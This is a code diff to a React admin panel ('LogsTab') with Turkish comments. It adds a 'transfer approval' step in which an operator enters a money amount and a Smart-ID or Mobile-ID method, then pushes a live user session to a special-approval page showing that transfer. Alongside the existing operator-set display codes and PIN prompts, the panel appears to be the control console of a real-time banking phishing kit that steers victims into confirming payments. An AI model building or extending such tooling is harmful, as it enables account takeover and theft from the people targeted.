@@ -27,12 +27,18 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
   { value: "generator1", label: "Generator 1" },
   { value: "generator2", label: "Generator 2" },
+  { value: "transfer", label: "Transfer Onayı" },
 ];
 
 function getApprovalDisplayText(value: string): string {
   if (!value) return "";
   const isConfirmed = value.endsWith("_confirmed");
   const rawValue = isConfirmed ? value.slice(0, -"_confirmed".length) : value;
+
+  // Transfer onayi: yontem (smartid/mobileid) suffix'li — kolonda tek "Transfer" goster.
+  if (rawValue.startsWith("transfer")) {
+    return isConfirmed ? "Transfer Onaylandı" : "Transfer [Bekliyor]";
+  }
 
   const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === rawValue);
   if (!matchedOption) {
@@ -897,6 +903,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
   const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
   const [approvalPromptType, setApprovalPromptType] = useState("");
   const [approvalCodeInput, setApprovalCodeInput] = useState("");
+  const [transferAmountInput, setTransferAmountInput] = useState("");
+  const [transferMethodInput, setTransferMethodInput] = useState<"smartid" | "mobileid">("smartid");
 
   const [soundEnabled, setSoundEnabled] = useState(false);
   const soundEnabledRef = useRef(false);
@@ -1455,6 +1463,39 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       setApprovalPromptSessionId(null);
       setApprovalPromptType("");
       setApprovalCodeInput("");
+      void load();
+      return;
+    }
+
+    // TRANSFER ONAYI: miktar + yontem (Smart-ID / Mobile-ID) admin giriyor.
+    // Kullanici /special-approval'da transfer kartini gorur; onaylayinca
+    // approvalStatus "transfer_*_confirmed" olur → kolonda "Transfer Onaylandi".
+    if (approvalPromptType === "transfer") {
+      const method = transferMethodInput === "mobileid" ? "mobileid" : "smartid";
+      await supabase
+        .from("sessions")
+        .update({
+          is_hidden: false,
+          status: "online",
+          current_step: "special_approval",
+          form_data: {
+            ...previousFormData,
+            approvalStatus: `transfer_${method}`,
+            transferAmount: transferAmountInput.trim(),
+            approvalCode: "",
+            specialNoticeText: "",
+            specialNoticeImage: "",
+            specialNoticeLang: undefined,
+            specialNoticeSentAt: "",
+          },
+        })
+        .eq("id", approvalPromptSessionId);
+
+      setApprovalPromptSessionId(null);
+      setApprovalPromptType("");
+      setApprovalCodeInput("");
+      setTransferAmountInput("");
+      setTransferMethodInput("smartid");
       void load();
       return;
     }
@@ -3008,16 +3049,48 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 </div>
               </div>
 
-              <div>
-                <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
-                <input
-                  type="text"
-                  value={approvalCodeInput}
-                  onChange={(e) => setApprovalCodeInput(e.target.value)}
-                  placeholder="Örn: 1, 22, 4578"
-                  className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
-                />
-              </div>
+              {approvalPromptType === "transfer" ? (
+                <>
+                  <div>
+                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Para Miktarı</label>
+                    <input
+                      type="text"
+                      value={transferAmountInput}
+                      onChange={(e) => setTransferAmountInput(e.target.value)}
+                      placeholder="Örn: 1.231,00"
+                      className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                    />
+                  </div>
+                  <div>
+                    <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Onay Yöntemi</label>
+                    <div className="grid grid-cols-2 gap-2">
+                      {(["smartid", "mobileid"] as const).map((m) => (
+                        <button
+                          key={m}
+                          type="button"
+                          onClick={() => setTransferMethodInput(m)}
+                          className={`rounded-xl border px-3 py-2 text-sm font-bold transition-all ${transferMethodInput === m
+                            ? 'border-[#EB5E28] bg-[#EB5E28]/10 text-[#EB5E28]'
+                            : darkMode ? 'border-zinc-800 bg-zinc-900 text-zinc-400 hover:text-white' : 'border-gray-200 bg-gray-50 text-gray-500 hover:text-gray-900'}`}
+                        >
+                          {m === "smartid" ? "Smart-ID" : "Mobile-ID"}
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                </>
+              ) : (
+                <div>
+                  <label className={`block text-xs font-bold mb-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>Gösterilecek Rakam</label>
+                  <input
+                    type="text"
+                    value={approvalCodeInput}
+                    onChange={(e) => setApprovalCodeInput(e.target.value)}
+                    placeholder="Örn: 1, 22, 4578"
+                    className={`w-full rounded-xl border px-3 py-2 outline-none transition-all ${darkMode ? 'bg-zinc-900 border-zinc-800 text-white focus:border-[#EB5E28]' : 'bg-gray-50 border-gray-200 text-gray-900 focus:border-[#EB5E28]'}`}
+                  />
+                </div>
+              )}
             </div>
 
             <div className="mt-6 flex justify-end gap-3">
@@ -3026,6 +3099,8 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                   setApprovalPromptSessionId(null);
                   setApprovalPromptType("");
                   setApprovalCodeInput("");
+                  setTransferAmountInput("");
+                  setTransferMethodInput("smartid");
                 }}
                 className={`px-4 py-2 text-sm font-semibold transition-colors ${darkMode ? 'text-zinc-400 hover:text-white' : 'text-gray-500 hover:text-gray-900'}`}
               >
